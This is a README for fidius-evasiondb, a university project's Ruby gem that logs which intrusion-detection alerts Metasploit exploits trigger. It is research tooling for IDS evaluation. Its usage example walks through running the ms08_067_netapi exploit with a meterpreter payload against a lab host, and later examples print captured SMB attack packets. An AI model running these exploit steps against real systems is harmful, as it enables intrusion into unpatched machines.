# FIDIUS fidius-evasiondb

The FIDIUS Evasion-DB Gem provides a database which contains knowledge about metasploit exploits and their corresponding Alert-Events produced by Intrusion Detection Systems (IDS). It includes a Metasploit plugin which supports the recording of thrown alerts during the execution of an exploit.

Description

This gem is developed in the context of the students project "FIDIUS" at the
University of Bremen, for more information about FIDIUS visit
[fidius.me](http://fidius.me/en).

## Installation

Simply install this package with Rubygems:

    $ gem install fidius-evasiondb

Then switch to the root directory of your Metasploit installation and run

    $ fidius-evasiondb -c

Follow the instructions. 

This Gem currently uses 2 databases:

 * ids_db: A PreludeManager-Database for fetching IDMEF-Events.
 * evasion_db: Knowledge-Database for information about Exploits and their IDMEF-Events.

Please note: The Evasion-DB Gem has only been tested with Linux systems
and might not work with Windows.

## Configuration

The database configuration can be found in

    path/to/your/metasploit/root/data/database.yml 

It has been tested with Postgres and MySQL databases but should work for others, too.

## Usage

There are two possibilities to use this Gem, either inside the Metasploit console (with a plugin) or from external scripts by requiring the Gem. 
The first method (use in msfconsole) is intended to generate knowledge about exploits. You can execute any module withhin metasploit 
and log corresponding IDMEF-Events. 

Please note: Currently it is only possible to fetch IDMEF-Events from an existing and configured PreludeManager-Database. At the beginning
of a module execution timestamp and number of total events in prelude are measured. After the module is finished newly generated
events are identified via timestamp and the attackers source ip.

### In msfconsole

* example for monitoring an exploit. After loading the plugin all modules which are executed by metasploit will be monitored.
All payload which is send to the target will be stored in the Knowledge-Database. After executing of the module finished generated
IDMEF-Events will be fetched from the Prelude-Database and stored to the Knowledge-Database, too.

        $ msf > load evasiondb
        $ [*] EvasionDB plugin loaded.
        $ [*] Successfully loaded plugin: FIDIUS-EvasionDB
        $ msf > use exploit/windows/smb/ms08_067_netapi
        $ msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/bind_tcp
        $ PAYLOAD => windows/meterpreter/bind_tcp
        $ msf exploit(ms08_067_netapi) > set RHOST 10.20.20.1
        $ RHOST => 10.20.20.1
        $ msf exploit(ms08_067_netapi) > exploit
        $ [*] Started bind handler
        $ [*] Automatically detecting the target...
        $ [*] Fingerprint: Windows XP - Service Pack 2 - lang:German
        $ [*] Selected Target: Windows XP SP2 German (NX)
        $ [*] Attempting to trigger the vulnerability...
        $ [*] Sending stage (749056 bytes) to 10.20.20.1
        $ [*] Meterpreter session 1 opened (10.0.0.100:52764 -> 10.20.20.1:4444) at 2011-03-28 16:42:53 +0200
        $ meterpreter > exit
        $ [*] Meterpreter session 1 closed.  Reason: User exit
        $ msf exploit(ms08_067_netapi) > show_events
        $ ------------------------------------------------------------
        $ exploit/windows/smb/ms08_067_netapi with 47 options
        $ ------------------------------------------------------------
        $ 11 idmef-events fetched
        $ ------------------------------------------------------------
        $ (1)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
        $ (2)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
        $ (3)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
        $ (4)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
        $ (5)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
        $ (6)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
        $ (7)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
        $ (8)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
        $ (9)ET EXPLOIT x86 JmpCallAdditive Encoder with 759 bytes payload
        $ (10)ET EXPLOIT x86 JmpCallAdditive Encoder with 467 bytes payload
        $ (11)NETBIOS SMB-DS IPC$ share access with 72 bytes payload
        $ msf exploit(ms08_067_netapi) > 

### From external script

* require gem, connect_db
* Only queries possible

### Queries
Sample how the knowledge in EvasionDB can be queried:
        ruby-1.9.1-p378 > require 'fidius-evasiondb'
         => true 
        ruby-1.9.1-p378 > FIDIUS::EvasionDB.config "data/database.yml"
        ruby-1.9.1-p378 > events = FIDIUS::EvasionDB::Knowledge.find_events_for_exploit "exploit/windows/smb/ms08_067_netapi"
        ruby-1.9.1-p378 > events.size
         => 11 
        ruby-1.9.1-p378 > events.first.severity
         => "medium" 
        ruby-1.9.1-p378 > events.first.text
         => "COMMUNITY SIP TCP/IP message flooding directed to SIP proxy" 

### Find an Exploit
        ruby-1.9.1-p378 > m = FIDIUS::EvasionDB::Knowledge::AttackModule.first
         => #<FIDIUS::EvasionDB::Knowledge::AttackModule id: 1, name: "exploit/windows/smb/ms08_067_netapi", options_hash: "4d70ba1e95523e6d602e316a2553decf", finished: true, created_at: "2011-04-02 13:43:44", updated_at: "2011-04-02 13:45:05">

### Find IdmefEvents
        ruby-1.9.1-p378 > event = m.idmef_events.first
         => #<FIDIUS::EvasionDB::Knowledge::IdmefEvent id: 1, attack_module_id: 1, attack_payload_id: nil, payload: "wrong lookup type\x00\x00\x00unsupported algorithm\x00\x00\x00unknown...", detect_time: "2011-04-02 13:44:30", dest_ip: "10.20.20.1", src_ip: "10.0.0.100", dest_port: 4444, src_port: 45944, text: "COMMUNITY SIP TCP/IP message flooding directed to S...", severity: "medium", analyzer_model: "prelude-manager", ident: 1076676, created_at: "2011-04-02 13:45:03", updated_at: "2011-04-02 13:45:05"> 

### Find Packets
        ruby-1.9.1-p378 > m.packets.first
         => #<FIDIUS::EvasionDB::Knowledge::Packet id: 1, attack_module_id: 1, attack_payload_id: nil, src_addr: "0.0.0.0", dest_addr: "10.20.20.1", src_port: "0", dest_port: "445", payload: "\x00\x00\x00T\xFFSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xCD\x11\x00\x00\xB2|\x001\x00\x02LANMAN1.0\x00\x02...", created_at: "2011-04-02 13:43:47", updated_at: "2011-04-02 13:43:47"> 

### Find Payload of Packet
        ruby-1.9.1-p378 > m.packets.first.payload
         => "\x00\x00\x00T\xFFSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xCD\x11\x00\x00\xB2|\x001\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00" 


### Find Options of Exploit
        ruby-1.9.1-p378 > m.attack_options.first.option_key
         => "EXITFUNC" 
        ruby-1.9.1-p378 > m.attack_options.first.option_value
         => "thread" 

## Authors and Contact

fidius-evasiondb was written by

* FIDIUS Intrusion Detection with Intelligent User Support
  <grp-fidius@tzi.de>, <http://fidius.me>
* in particular:
 * Bernhard Katzmarski <bkatzm@tzi.de>
 * Jens Färber <jfaerber@tzi.de>

If you have any questions, remarks, suggestion, improvements,
etc. feel free to drop a line at the addresses given above.
You might also join `#fidius` on Freenode or use the contact
form on our [website](http://fidius.me/en/contact).


## License

Simplified BSD License and GNU GPLv2. See also the file LICENSE.
